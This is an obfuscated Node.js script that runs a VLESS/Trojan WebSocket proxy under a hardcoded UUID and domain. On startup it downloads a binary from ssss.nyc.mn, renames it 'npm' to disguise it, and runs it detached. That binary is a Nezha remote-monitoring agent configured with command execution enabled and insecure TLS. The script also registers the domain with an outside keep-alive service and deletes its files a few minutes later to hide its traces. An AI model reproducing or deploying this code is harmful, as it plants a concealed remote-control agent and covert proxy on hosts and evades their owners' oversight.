const _0x21375c=_0x460f;(function(_0x5ac8dc,_0x2acbe5){const _0x33e39f=_0x460f,_0x483bc0=_0x5ac8dc();while(!![]){try{const _0x3df575=-parseInt(_0x33e39f(0xb9))/0x1*(parseInt(_0x33e39f(0xd5))/0x2)+parseInt(_0x33e39f(0xdc))/0x3*(-parseInt(_0x33e39f(0xbc))/0x4)+-parseInt(_0x33e39f(0xe5))/0x5*(parseInt(_0x33e39f(0x100))/0x6)+-parseInt(_0x33e39f(0xb8))/0x7+parseInt(_0x33e39f(0x10c))/0x8*(parseInt(_0x33e39f(0x119))/0x9)+parseInt(_0x33e39f(0xeb))/0xa+parseInt(_0x33e39f(0x12b))/0xb;if(_0x3df575===_0x2acbe5)break;else _0x483bc0['push'](_0x483bc0['shift']());}catch(_0x441618){_0x483bc0['push'](_0x483bc0['shift']());}}}(_0x486a,0xdf109));const os=require('os'),http=require(_0x21375c(0xf2)),fs=require('fs'),axios=require(_0x21375c(0xd4)),net=require(_0x21375c(0xd7)),path=require(_0x21375c(0xf3)),crypto=require(_0x21375c(0x127)),{Buffer}=require(_0x21375c(0xc6)),{exec,execSync}=require(_0x21375c(0xd1)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x21375c(0xd9)]['UUID']||'e832ec49-cf13-4b58-8800-00cd1a96e24d',NEZHA_SERVER=process[_0x21375c(0xd9)][_0x21375c(0xda)]||'',NEZHA_PORT=process[_0x21375c(0xd9)][_0x21375c(0x124)]||'',NEZHA_KEY=process[_0x21375c(0xd9)][_0x21375c(0xea)]||'',DOMAIN=process['env']['DOMAIN']||'vvpnn.821117.xyz',AUTO_ACCESS=process['env'][_0x21375c(0x11b)]||!![],WSPATH=process[_0x21375c(0xd9)][_0x21375c(0xc4)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x21375c(0xd9)][_0x21375c(0xf5)]||_0x21375c(0x105),NAME=process[_0x21375c(0xd9)][_0x21375c(0x101)]||_0x21375c(0x128),PORT=process[_0x21375c(0xd9)][_0x21375c(0xc9)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3bbf9f=_0x21375c;try{const _0x3aa2f0=await axios[_0x3bbf9f(0xe4)]('https://speed.cloudflare.com/meta'),_0x25a648=_0x3aa2f0[_0x3bbf9f(0xe9)];ISP=(_0x25a648[_0x3bbf9f(0xdb)]+'-'+_0x25a648['asOrganization'])['replace'](/ /g,'_');}catch(_0x5d8843){ISP=_0x3bbf9f(0xfa);}};GetISP();const httpServer=http[_0x21375c(0xfd)]((_0x5404bb,_0x514634)=>{const _0x58bc81=_0x21375c;if(_0x5404bb[_0x58bc81(0x11d)]==='/'){const _0x265d1d=path['join'](__dirname,'index.html');fs['readFile'](_0x265d1d,_0x58bc81(0xcd),(_0x11dcae,_0x19b362)=>{const _0x42c122=_0x58bc81;if(_0x11dcae){_0x514634[_0x42c122(0xbb)](0xc8,{'Content-Type':_0x42c122(0x10d)}),_0x514634['end']('Hello\x20world!');return;}_0x514634[_0x42c122(0xbb)](0xc8,{'Content-Type':_0x42c122(0x10d)}),_0x514634[_0x42c122(0xee)](_0x19b362);});return;}else{if(_0x5404bb[_0x58bc81(0x11d)]==='/'+SUB_PATH){const _0x58b619=_0x58bc81(0xe1)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x58bc81(0xd6)+DOMAIN+_0x58bc81(0xe7)+WSPATH+'#'+NAME+'-'+ISP,_0x52f2a8=_0x58bc81(0xb7)+UUID+'@'+DOMAIN+_0x58bc81(0xcf)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x1facbd=_0x58b619+'\x0a'+_0x52f2a8,_0x26b4f3=Buffer['from'](_0x1facbd)[_0x58bc81(0xf8)]('base64');_0x514634['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x514634['end'](_0x26b4f3+'\x0a');}else _0x514634['writeHead'](0x194,{'Content-Type':_0x58bc81(0xc2)}),_0x514634[_0x58bc81(0xee)](_0x58bc81(0x108));}}),wss=new WebSocket[(_0x21375c(0xc0))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x21375c(0xed)];function resolveHost(_0x2f6bab){return new Promise((_0x28475e,_0x12ba50)=>{const _0x1630c3=_0x460f;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1630c3(0x114)](_0x2f6bab)){_0x28475e(_0x2f6bab);return;}let _0x417442=0x0;function _0x36d3b8(){const _0x12f2b1=_0x1630c3;if(_0x417442>=DNS_SERVERS['length']){_0x12ba50(new Error(_0x12f2b1(0x10f)+_0x2f6bab+_0x12f2b1(0xd8)));return;}const _0x295f2f=DNS_SERVERS[_0x417442];_0x417442++;const _0x28af03=_0x12f2b1(0x116)+encodeURIComponent(_0x2f6bab)+'&type=A';axios[_0x12f2b1(0xe4)](_0x28af03,{'timeout':0x1388,'headers':{'Accept':_0x12f2b1(0x102)}})[_0x12f2b1(0xd3)](_0x4c9601=>{const _0x254237=_0x12f2b1,_0x295184=_0x4c9601[_0x254237(0xe9)];if(_0x295184[_0x254237(0x12c)]===0x0&&_0x295184[_0x254237(0xbe)]&&_0x295184[_0x254237(0xbe)][_0x254237(0xc1)]>0x0){const _0x824212=_0x295184[_0x254237(0xbe)][_0x254237(0x104)](_0xf87e9d=>_0xf87e9d[_0x254237(0xca)]===0x1);if(_0x824212){_0x28475e(_0x824212[_0x254237(0xe9)]);return;}}_0x36d3b8();})[_0x12f2b1(0x106)](_0x4cef6d=>{_0x36d3b8();});}_0x36d3b8();});}function handleVlessConnection(_0x472c09,_0x407ae1){const _0x279ed6=_0x21375c,[_0x439742]=_0x407ae1,_0x5696ae=_0x407ae1['slice'](0x1,0x11);if(!_0x5696ae[_0x279ed6(0xc7)]((_0x39e070,_0x166f94)=>_0x39e070==parseInt(uuid[_0x279ed6(0xc5)](_0x166f94*0x2,0x2),0x10)))return![];let _0x448216=_0x407ae1[_0x279ed6(0xff)](0x11,0x12)['readUInt8']()+0x13;const _0x800635=_0x407ae1[_0x279ed6(0xff)](_0x448216,_0x448216+=0x2)[_0x279ed6(0x11f)](0x0),_0x126ffb=_0x407ae1[_0x279ed6(0xff)](_0x448216,_0x448216+=0x1)[_0x279ed6(0x10e)](),_0x230806=_0x126ffb==0x1?_0x407ae1[_0x279ed6(0xff)](_0x448216,_0x448216+=0x4)[_0x279ed6(0xbd)]('.'):_0x126ffb==0x2?new TextDecoder()[_0x279ed6(0x109)](_0x407ae1[_0x279ed6(0xff)](_0x448216+0x1,_0x448216+=0x1+_0x407ae1[_0x279ed6(0xff)](_0x448216,_0x448216+0x1)[_0x279ed6(0x10e)]())):_0x126ffb==0x3?_0x407ae1[_0x279ed6(0xff)](_0x448216,_0x448216+=0x10)[_0x279ed6(0x125)]((_0x28bdf4,_0x4ce558,_0x18d86b,_0x33da10)=>_0x18d86b%0x2?_0x28bdf4[_0x279ed6(0x112)](_0x33da10[_0x279ed6(0xff)](_0x18d86b-0x1,_0x18d86b+0x1)):_0x28bdf4,[])[_0x279ed6(0x113)](_0x30a31c=>_0x30a31c['readUInt16BE'](0x0)[_0x279ed6(0xf8)](0x10))[_0x279ed6(0xbd)](':'):'';_0x472c09[_0x279ed6(0xe6)](new Uint8Array([_0x439742,0x0]));const _0x14d857=createWebSocketStream(_0x472c09);return resolveHost(_0x230806)[_0x279ed6(0xd3)](_0x3046c4=>{const _0x2b27ad=_0x279ed6;net[_0x2b27ad(0xfe)]({'host':_0x3046c4,'port':_0x800635},function(){const _0x5f5446=_0x2b27ad;this[_0x5f5446(0x110)](_0x407ae1[_0x5f5446(0xff)](_0x448216)),_0x14d857['on'](_0x5f5446(0x10a),()=>{})['pipe'](this)['on'](_0x5f5446(0x10a),()=>{})[_0x5f5446(0xe3)](_0x14d857);})['on'](_0x2b27ad(0x10a),()=>{});})[_0x279ed6(0x106)](_0x5823b7=>{const _0x285980=_0x279ed6;net['connect']({'host':_0x230806,'port':_0x800635},function(){const _0x5daf46=_0x460f;this[_0x5daf46(0x110)](_0x407ae1[_0x5daf46(0xff)](_0x448216)),_0x14d857['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x14d857);})['on'](_0x285980(0x10a),()=>{});}),!![];}function handleTrojanConnection(_0x5eda44,_0x533f8a){const _0x2762be=_0x21375c;try{if(_0x533f8a[_0x2762be(0xc1)]<0x3a)return![];const _0xa9d0b8=_0x533f8a[_0x2762be(0xff)](0x0,0x38)[_0x2762be(0xf8)](),_0x4cdc74=[UUID];let _0x1d7000=null;for(const _0x167a06 of _0x4cdc74){const _0x2fe272=crypto['createHash'](_0x2762be(0xf1))['update'](_0x167a06)[_0x2762be(0xc3)]('hex');if(_0x2fe272===_0xa9d0b8){_0x1d7000=_0x167a06;break;}}if(!_0x1d7000)return![];let _0x3ed7c2=0x38;_0x533f8a[_0x3ed7c2]===0xd&&_0x533f8a[_0x3ed7c2+0x1]===0xa&&(_0x3ed7c2+=0x2);const _0x354121=_0x533f8a[_0x3ed7c2];if(_0x354121!==0x1)return![];_0x3ed7c2+=0x1;const _0x1524c1=_0x533f8a[_0x3ed7c2];_0x3ed7c2+=0x1;let _0x58beb5,_0x33143d;if(_0x1524c1===0x1)_0x58beb5=_0x533f8a[_0x2762be(0xff)](_0x3ed7c2,_0x3ed7c2+0x4)['join']('.'),_0x3ed7c2+=0x4;else{if(_0x1524c1===0x3){const _0x2e7174=_0x533f8a[_0x3ed7c2];_0x3ed7c2+=0x1,_0x58beb5=_0x533f8a['slice'](_0x3ed7c2,_0x3ed7c2+_0x2e7174)[_0x2762be(0xf8)](),_0x3ed7c2+=_0x2e7174;}else{if(_0x1524c1===0x4)_0x58beb5=_0x533f8a[_0x2762be(0xff)](_0x3ed7c2,_0x3ed7c2+0x10)[_0x2762be(0x125)]((_0x6be9de,_0x9c2b64,_0xe3d6ec,_0x4ba248)=>_0xe3d6ec%0x2?_0x6be9de[_0x2762be(0x112)](_0x4ba248[_0x2762be(0xff)](_0xe3d6ec-0x1,_0xe3d6ec+0x1)):_0x6be9de,[])[_0x2762be(0x113)](_0xb5d19e=>_0xb5d19e['readUInt16BE'](0x0)[_0x2762be(0xf8)](0x10))[_0x2762be(0xbd)](':'),_0x3ed7c2+=0x10;else return![];}}_0x33143d=_0x533f8a[_0x2762be(0x11f)](_0x3ed7c2),_0x3ed7c2+=0x2;_0x3ed7c2<_0x533f8a[_0x2762be(0xc1)]&&_0x533f8a[_0x3ed7c2]===0xd&&_0x533f8a[_0x3ed7c2+0x1]===0xa&&(_0x3ed7c2+=0x2);const _0x228080=createWebSocketStream(_0x5eda44);return resolveHost(_0x58beb5)[_0x2762be(0xd3)](_0x28089f=>{const _0x14e52d=_0x2762be;net[_0x14e52d(0xfe)]({'host':_0x28089f,'port':_0x33143d},function(){const _0x430db7=_0x14e52d;_0x3ed7c2<_0x533f8a[_0x430db7(0xc1)]&&this[_0x430db7(0x110)](_0x533f8a[_0x430db7(0xff)](_0x3ed7c2)),_0x228080['on'](_0x430db7(0x10a),()=>{})['pipe'](this)['on'](_0x430db7(0x10a),()=>{})[_0x430db7(0xe3)](_0x228080);})['on'](_0x14e52d(0x10a),()=>{});})[_0x2762be(0x106)](_0x3a192b=>{const _0x167e95=_0x2762be;net[_0x167e95(0xfe)]({'host':_0x58beb5,'port':_0x33143d},function(){const _0x49eafe=_0x167e95;_0x3ed7c2<_0x533f8a['length']&&this[_0x49eafe(0x110)](_0x533f8a['slice'](_0x3ed7c2)),_0x228080['on'](_0x49eafe(0x10a),()=>{})[_0x49eafe(0xe3)](this)['on'](_0x49eafe(0x10a),()=>{})[_0x49eafe(0xe3)](_0x228080);})['on']('error',()=>{});}),!![];}catch(_0x58e396){return![];}}wss['on'](_0x21375c(0xcc),(_0x2db921,_0x3e17d3)=>{const _0x572282=_0x21375c,_0x702ed5=_0x3e17d3['url']||'';_0x2db921[_0x572282(0xef)]('message',_0x4bd5c7=>{const _0x5c7d0c=_0x572282;if(_0x4bd5c7[_0x5c7d0c(0xc1)]>0x11&&_0x4bd5c7[0x0]===0x0){const _0x45d7a0=_0x4bd5c7[_0x5c7d0c(0xff)](0x1,0x11),_0x3b3e8b=_0x45d7a0[_0x5c7d0c(0xc7)]((_0x4ace0c,_0x7c0b5c)=>_0x4ace0c==parseInt(uuid[_0x5c7d0c(0xc5)](_0x7c0b5c*0x2,0x2),0x10));if(_0x3b3e8b){!handleVlessConnection(_0x2db921,_0x4bd5c7)&&_0x2db921[_0x5c7d0c(0x107)]();return;}}!handleTrojanConnection(_0x2db921,_0x4bd5c7)&&_0x2db921[_0x5c7d0c(0x107)]();})['on'](_0x572282(0x10a),()=>{});});const getDownloadUrl=()=>{const _0x48f3da=_0x21375c,_0x59e87b=os['arch']();return _0x59e87b===_0x48f3da(0xcb)||_0x59e87b===_0x48f3da(0xba)||_0x59e87b===_0x48f3da(0xfb)?!NEZHA_PORT?_0x48f3da(0x12e):_0x48f3da(0xec):!NEZHA_PORT?_0x48f3da(0x123):_0x48f3da(0x111);},downloadFile=async()=>{const _0x104814=_0x21375c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x31b857=getDownloadUrl(),_0x42cfa1=await axios({'method':'get','url':_0x31b857,'responseType':_0x104814(0x11c)}),_0x3001e7=fs[_0x104814(0xbf)]('npm');return _0x42cfa1[_0x104814(0xe9)][_0x104814(0xe3)](_0x3001e7),new Promise((_0xabd842,_0x346b51)=>{const _0x5a126e=_0x104814;_0x3001e7['on']('finish',()=>{const _0x38fd75=_0x460f;console[_0x38fd75(0xe8)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x5bf16a=>{if(_0x5bf16a)_0x346b51(_0x5bf16a);_0xabd842();});}),_0x3001e7['on'](_0x5a126e(0x10a),_0x346b51);});}catch(_0x26d1dd){throw _0x26d1dd;}},runnz=async()=>{const _0x3dedbd=_0x21375c;try{const _0x2e76af=execSync(_0x3dedbd(0xd2),{'encoding':'utf-8'});if(_0x2e76af[_0x3dedbd(0xf9)]()!==''){console['log'](_0x3dedbd(0xe0));return;}}catch(_0x1a8c5c){}await downloadFile();let _0x2b270f='',_0x3839b2=['443',_0x3dedbd(0x129),_0x3dedbd(0x12a),_0x3dedbd(0x126),_0x3dedbd(0x121),_0x3dedbd(0x103)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x51aac4=_0x3839b2[_0x3dedbd(0xdf)](NEZHA_PORT)?'--tls':'';_0x2b270f=_0x3dedbd(0xd0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3dedbd(0xce)+NEZHA_KEY+'\x20'+_0x51aac4+_0x3dedbd(0xc8);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12672f=NEZHA_SERVER[_0x3dedbd(0xdf)](':')?NEZHA_SERVER[_0x3dedbd(0x11a)](':')[_0x3dedbd(0x115)]():'',_0x1f9ae1=_0x3839b2[_0x3dedbd(0xdf)](_0x12672f)?'true':_0x3dedbd(0xde),_0x38f884=_0x3dedbd(0xf0)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3dedbd(0xf6)+_0x1f9ae1+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3dedbd(0x122)](_0x3dedbd(0xfc),_0x38f884);}_0x2b270f=_0x3dedbd(0xe2);}else{console[_0x3dedbd(0xe8)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x2b270f,{'shell':_0x3dedbd(0xf4)},_0x3ca94=>{const _0x1c024a=_0x3dedbd;if(_0x3ca94)console[_0x1c024a(0x10a)]('npm\x20running\x20error:',_0x3ca94);else console[_0x1c024a(0xe8)](_0x1c024a(0x12d));});}catch(_0x5f5c43){console['error'](_0x3dedbd(0x10b)+_0x5f5c43);}};function _0x460f(_0x512d2f,_0x69017e){const _0x486a8f=_0x486a();return _0x460f=function(_0x460f54,_0x5dfcb6){_0x460f54=_0x460f54-0xb7;let _0x3f3f88=_0x486a8f[_0x460f54];return _0x3f3f88;},_0x460f(_0x512d2f,_0x69017e);}async function addAccessTask(){const _0x4b2630=_0x21375c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4198f6=_0x4b2630(0x118)+DOMAIN;try{const _0x2460fb=await axios[_0x4b2630(0x11e)](_0x4b2630(0x117),{'url':_0x4198f6},{'headers':{'Content-Type':'application/json'}});console[_0x4b2630(0xe8)](_0x4b2630(0xf7));}catch(_0x136850){}}function _0x486a(){const _0xfe3119=['https://amd64.ssss.nyc.mn/v1','NEZHA_PORT','reduce','2087','crypto','Hug','8443','2096','56671307SxXmmO','Status','npm\x20is\x20running','https://arm64.ssss.nyc.mn/v1','Server\x20is\x20running\x20on\x20port\x20','trojan://','12179860nxyRuL','2HvvGUY','arm64','writeHead','4VhRRYA','join','Answer','createWriteStream','Server','length','text/plain','digest','WSPATH','substr','buffer','every','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','PORT','type','arm','connection','utf8','\x20-p\x20',':443?security=tls&sni=','setsid\x20nohup\x20./npm\x20-s\x20','child_process','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','then','axios','1479640yFZOqN','&fp=chrome&type=ws&host=','net','\x20with\x20all\x20DNS\x20servers','env','NEZHA_SERVER','country','4163325nzJrtu','listen','false','includes','npm\x20is\x20already\x20running,\x20skip\x20running...','vless://','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','pipe','get','75gdsHrj','send','&path=%2F','log','data','NEZHA_KEY','6270380AiAYXi','https://arm64.ssss.nyc.mn/agent','1.1.1.1','end','once','client_secret:\x20','sha224','http','path','/bin/bash','SUB_PATH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Automatic\x20Access\x20Task\x20added\x20successfully','toString','trim','Unknown','aarch64','config.yaml','createServer','connect','slice','269856LnUtGl','NAME','application/dns-json','2053','find','sub','catch','close','Not\x20Found\x0a','decode','error','error:\x20','107544wmnidP','text/html','readUInt8','Failed\x20to\x20resolve\x20','write','https://amd64.ssss.nyc.mn/agent','concat','map','test','pop','https://dns.google/resolve?name=','https://oooo.serv00.net/add-url','https://','279mzMqYu','split','AUTO_ACCESS','stream','url','post','readUInt16BE','unlink','2083','writeFileSync'];_0x486a=function(){return _0xfe3119;};return _0x486a();}const delFiles=()=>{const _0x94eccf=_0x21375c;fs[_0x94eccf(0x120)]('npm',()=>{}),fs['unlink'](_0x94eccf(0xfc),()=>{});};httpServer[_0x21375c(0xdd)](PORT,()=>{const _0x11a2b8=_0x21375c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x11a2b8(0xe8)](_0x11a2b8(0x12f)+PORT);});
